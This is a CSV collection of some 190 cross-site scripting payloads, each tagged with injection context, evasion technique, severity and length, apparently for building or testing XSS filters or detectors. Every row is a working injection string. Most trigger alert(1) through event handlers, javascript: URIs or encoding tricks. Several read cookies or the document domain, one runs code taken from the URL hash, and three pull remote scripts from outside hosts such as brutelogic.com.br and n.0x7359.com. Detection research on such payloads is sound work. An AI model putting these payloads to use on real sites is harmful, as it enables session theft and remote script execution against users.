payload,context,technique,severity,length
"<style>:target {color: red;}</style><meta id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meta>",tag_injection,none,medium,111
<dt onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53
"<IMG SRC=x onloadedmetadata=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,67
"<iframe2 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",tag_injection,none,medium,91
"<button onclick=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,49
"<h1 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</h1>",tag_injection,none,medium,77
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></data>",tag_injection,none,medium,112
"<select onmouseenter=""alert(1)"">AnonKryptiQuz</select>",tag_injection,none,medium,54
"&lt;&lt;SCRIPT&gt;alert(\""XSS\"");//&lt;&lt;/SCRIPT&gt;",generic,none,medium,54
<form onpointerdown=alert(1) style=display:block>AnonKryptiQuz</form>,tag_injection,none,medium,69
<img onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</img><input value=clickme>,tag_injection,none,medium,97
"<noembed onmouseleave=""alert(1)"">AnonKryptiQuz</noembed>",tag_injection,none,medium,56
<big onpointerout=alert(1) style=display:block>AnonKryptiQuz</big>,tag_injection,none,medium,66
"<!--<img src=""--><img src=x onerror=alert(AnonKryptiQuz)//"">",tag_injection,comment_injection,medium,60
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></plaintext>",tag_injection,none,medium,121
"<style>:target {color: red;}</style><main id=x style=""transition:color 10s"" ontransitioncancel=print()></main>",tag_injection,none,low,110
"<section oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</section>",tag_injection,none,medium,66
<svg id=`x`onload=alert(1)>,tag_injection,none,medium,27
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",tag_injection,none,medium,128
%E5%98%8D%E5%98%8ASet-Cookie%3A%20whoami%3Dthecyberneh%25u2028%25u2029AnonKryptiQuz-Payload%3A%2520%3Cscript%3Ealert%281%29%3C%2Fscript%3E,generic,url_encoding,low,138
"<image onmouseenter=""alert(1)"">AnonKryptiQuz</image>",tag_injection,none,medium,52
"<menu onmouseup=""alert(1)"">AnonKryptiQuz</menu>",tag_injection,none,medium,47
"<custom tags id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></custom tags>",tag_injection,none,medium,98
<var onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</var><input value=clickme>,tag_injection,none,medium,106
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bdo>",tag_injection,none,medium,160
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",dom_sink,html_entity,low,77
"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>",tag_injection,none,medium,99
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('AnonKryptiQuz');"">",js_uri,case_variation,medium,78
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",js_uri,none,medium,51
<video onloadstart=alert()><source></*>,tag_injection,none,medium,39
"<div draggable=""true"" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>",tag_injection,none,medium,115
"<rtc onmouseup=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,45
');alert(1)//,attribute_escape,none,medium,13
"<style>@keyframes x{}</style><form style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></form>",tag_injection,none,medium,101
"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figure>",tag_injection,none,medium,115
"<section draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</section>",tag_injection,none,medium,67
<listing id=x tabindex=1 ondeactivate=alert(1)></listing><input id=y autofocus>,tag_injection,none,medium,79
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a>,js_uri,none,medium,88
"<link rel=""stylesheet"" href=""javascript:document.vulnerable=true;"">",dom_sink,none,low,67
<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>,tag_injection,none,medium,66
<noframes onpointerout=alert(1) style=display:block>AnonKryptiQuz</noframes>,tag_injection,none,medium,76
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>",tag_injection,none,medium,117
<svg><address onload=alert(1)></address>,tag_injection,none,medium,40
"<div draggable=""true"" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>",tag_injection,none,medium,107
<rp onpointermove=alert(1) style=display:block>AnonKryptiQuz</rp>,tag_injection,none,medium,65
<abbr onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</abbr><input value=clickme>,tag_injection,none,medium,99
"<tr draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</tr>",tag_injection,none,medium,62
"<frame onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,69
<script>'confirm(0)%3B<%2Fscript>,script_injection,url_encoding,medium,33
<animate onpointerout=alert(1) style=display:block>AnonKryptiQuz</animate>,tag_injection,none,medium,74
"<font oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,71
-setTimeout`prompt\u0028document.domain\u0029`-',dom_sink,unicode_escape,low,48
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,tag_injection,none,medium,66
"<b onmouseenter=""alert(1)"">AnonKryptiQuz</b>",tag_injection,none,medium,44
"'"">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)>",tag_injection,none,medium,106
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",dom_sink,none,low,83
<p contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,55
"<samp onmouseout=""alert(1)"">AnonKryptiQuz</samp>",tag_injection,none,medium,48
"<kbd onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",tag_injection,none,medium,67
"<meter onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",tag_injection,none,medium,72
<img src=”invalid-image” onerror=”alert(document.cookie)”>,dom_sink,none,high,58
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable style=display:block>drop here</template>",tag_injection,none,medium,137
"<div draggable=""true"" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable style=display:block>drop here</dfn>",tag_injection,none,medium,123
"<head onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</head>",tag_injection,none,medium,67
(A(%22onerror=%22alert%601%60%22)),event_handler,url_encoding,low,34
"<noframes draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</noframes>",tag_injection,none,medium,72
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>,tag_injection,none,medium,61
"<abbr draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",tag_injection,none,medium,86
{{{}.toString.constructor('confirm(1)')()}},template_injection,none,medium,43
"<strike draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",tag_injection,none,medium,90
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><custom tags id=x style=""position:absolute;"" onanimationcancel=""print()""></custom tags>",tag_injection,none,low,191
"<script>var a=document.createElement(""a"");a.href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="";http://a.click();</script>",dom_sink,none,low,136
<style onpointerup=alert(1) style=display:block>AnonKryptiQuz</style>,tag_injection,none,medium,69
<image onpointerdown=alert(1) style=display:block>AnonKryptiQuz</image>,tag_injection,none,medium,71
"<nav onmouseup=""alert(1)"">AnonKryptiQuz</nav>",tag_injection,none,medium,45
<<scr\0ipt/src=http://xss.com/xss.js></script,generic,none,low,45
"<div draggable=""true"" contenteditable>drag me</div><video2 ondragover=alert(1) contenteditable style=display:block>drop here</video2>",tag_injection,none,medium,133
"""><img src=x onerror='alert(document.domain)'>",dom_sink,none,medium,46
"<div style=""font-family:foo}color=red;"">XXX",attribute_escape,none,low,43
"STYLE=""xss:expr/*AnonKryptiQuz*/ession(alert('AnonKryptiQuz')"">",attribute_escape,comment_injection,medium,63
"<u onmousedown=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,43
"<img%20hrEF=""x""%20sRC=""data:x,""%20oNLy=1%20oNErrOR=prompt1>",tag_injection,url_encoding,low,59
"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>",tag_injection,none,medium,107
"<details onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</details>",tag_injection,none,medium,89
</form>,generic,none,low,7
"<noembed oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,77
{text:<img/src=x onload=confirm(1)>},tag_injection,none,medium,36
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,tag_injection,none,medium,59
"<bdo draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</bdo>",tag_injection,none,medium,62
<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>,tag_injection,none,medium,77
<noscript onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</noscript>,tag_injection,none,medium,82
<kbd onpointerup=alert(1) style=display:block>AnonKryptiQuz</kbd>,tag_injection,none,medium,65
"<a onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</a>",tag_injection,none,medium,64
<section id=x tabindex=1 onfocusin=alert(1)></section>,tag_injection,none,medium,54
<frame onpointerover=alert(1) style=display:block>AnonKryptiQuz</frame>,tag_injection,none,medium,71
"<noembed oncontextmenu=""alert(1)"">AnonKryptiQuz</noembed>",tag_injection,none,medium,57
"<slot onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",tag_injection,none,medium,67
"<acronym onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",tag_injection,none,medium,67
"<address onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</address>",tag_injection,none,medium,67
<element contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,61
"<optgroup draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",tag_injection,none,medium,93
"<tfoot onmouseover=""alert(1)"">AnonKryptiQuz</tfoot>",tag_injection,none,medium,51
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,dom_sink,none,high,79
"<t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;"">//[""'`-->]]>]</div>",attribute_escape,html_entity,high,127
<button popovertarget=x>Click me</button><param ontoggle=alert(1) popover id=x>AnonKryptiQuz</param>,tag_injection,none,medium,100
?msg=<img/src=`%00`%20onerror=this.onerror=confirm(1),tag_injection,url_encoding,medium,53
"<nav oncut=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",tag_injection,none,medium,57
"<;INPUT TYPE="";IMAGE""; SRC="";javascript:alert(';XSS';);"";>;",js_uri,none,medium,59
<noframes onpointermove=alert(1) style=display:block>AnonKryptiQuz</noframes>,tag_injection,none,medium,77
-alert(1)-',generic,none,medium,11
<map onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</map><input value=clickme>,tag_injection,none,medium,106
&#x3C;img src=1 onerror=alert(1)&#x3E;,event_handler,html_entity,medium,38
"<style>@keyframes slidein {}</style><section style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></section>",tag_injection,none,medium,174
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",tag_injection,none,medium,103
"<link draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</link>",tag_injection,none,medium,81
"<form id=""AnonKryptiQuz"" /><button form=""AnonKryptiQuz"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION",js_uri,none,medium,110
<input type=checkbox id=x onfocus=alert(1)>,tag_injection,none,medium,43
"<script y=""><"">/*<script* */prompt()</script",script_injection,comment_injection,medium,44
"<img2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></img2>",tag_injection,none,medium,84
"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></element>",tag_injection,none,medium,174
"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",tag_injection,none,medium,109
"<script>alert(""AnonKryptiQuz"");</script>&search=1",script_injection,none,medium,49
"<style>:target {color:red;}</style><noembed id=x style=""transition:color 1s"" ontransitionend=alert(1)></noembed>",tag_injection,none,medium,112
<th onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</th>,tag_injection,none,medium,70
"<frameset onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",tag_injection,none,medium,69
<applet id=x tabindex=1 onfocusin=alert(1)></applet>,tag_injection,none,medium,52
"<map draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</map>",tag_injection,none,medium,64
"<iframe oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</iframe>",tag_injection,none,medium,75
"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></style>",tag_injection,none,medium,170
'() {'document.createElement('img').src='javascript:while(1){}',dom_sink,none,high,63
<script src=//brutelogic.com.br/1.js>,script_injection,none,low,37
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,tag_injection,none,medium,60
"<dialog onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",tag_injection,none,medium,69
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,script_injection,case_variation,medium,39
"<strike oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99
"<font oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98
"<title id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></title>",tag_injection,none,medium,86
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,tag_injection,none,medium,56
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,encoding|case_variation,high,67
%3Cinput%20onfocus%3D%60alert%28%60AnonKryptiQuz%60%29%60%3E,generic,url_encoding,low,60
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationstart=""alert(1)""></base>",tag_injection,none,medium,95
"<bgsound onmousedown=""alert(1)"">AnonKryptiQuz</bgsound>",tag_injection,none,medium,55
<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>,tag_injection,none,medium,59
<meter onpointerdown=alert(1) style=display:block>AnonKryptiQuz</meter>,tag_injection,none,medium,71
<a2 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</a2><input value=clickme>,tag_injection,none,medium,95
"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",tag_injection,none,medium,130
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=""position:absolute;"" onanimationcancel=""print()""></head>",tag_injection,none,low,177
"<map draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</map>",tag_injection,none,medium,59
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></embed>",tag_injection,none,medium,170
"<input4 onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",tag_injection,none,medium,73
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=print()></rb>",tag_injection,none,low,106
"<dt onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",tag_injection,none,medium,66
"<source onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</source>",tag_injection,none,medium,88
<object onerror=javascript:javascript:alert(7032)>,js_uri,none,medium,50
<iframe onpointerup=alert(1) style=display:block>AnonKryptiQuz</iframe>,tag_injection,none,medium,71
"<h1 onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",tag_injection,none,medium,65
1script3document.vulnerable=true;1/script3,dom_sink,none,low,42
<label id=x tabindex=1 onactivate=alert(1)></label>,tag_injection,none,medium,51
"<nav onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</nav>",tag_injection,none,medium,81
"<link rel=""stylesheet"" href=""#"" onload=""window.alert('AnonKryptiQuz')"">",dom_sink,none,medium,71
"<footer onmouseup=""alert(1)"">AnonKryptiQuz</footer>",tag_injection,none,medium,51
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",tag_injection,none,medium,111
<figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>,tag_injection,none,medium,61
"<details oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</details>",tag_injection,none,medium,66
<samp onpointerleave=alert(1) style=display:block>AnonKryptiQuz</samp>,tag_injection,none,medium,70
"<style>:target {color:red;}</style><a id=x style=""transition:color 1s"" ontransitionend=alert(1)></a>",tag_injection,none,medium,100
<listing id=x tabindex=1 onfocusin=alert(1)></listing>,tag_injection,none,medium,54
"<table background=""javascript:javascript:alert(/AmoloHT/)"">",js_uri,none,medium,59
"<rb oncut=""alert(1)"" contenteditable>AnonKryptiQuz</rb>",tag_injection,none,medium,55
"<picture onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",tag_injection,none,medium,74
<textarea onselect=alert(1) autofocus>AnonKryptiQuz</textarea>,tag_injection,none,medium,62
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",script_injection,none,medium,101
"';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//",dom_sink,none,low,222
"<style><img src=""</style><img src=x ""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",js_uri,none,low,121
%3cscript%3ealert('XSS')%3c/script%3e,generic,url_encoding,medium,37
"<hgroup onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",tag_injection,none,medium,70
"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",event_handler,none,medium,149
<scr%00ipt>prompt(1)</sc%00ript>,generic,url_encoding,medium,32
http://www.<script>alert(1)</script .com,script_injection,none,medium,40
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,tag_injection,none,medium,70
"<div draggable=""true"" contenteditable>drag me</div><img2 ondragover=alert(1) contenteditable style=display:block>drop here</img2>",tag_injection,none,medium,129
"<abbr draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,61
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationend=""alert(1)""></frame>",tag_injection,none,medium,95
"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",dom_sink,encoding,high,70
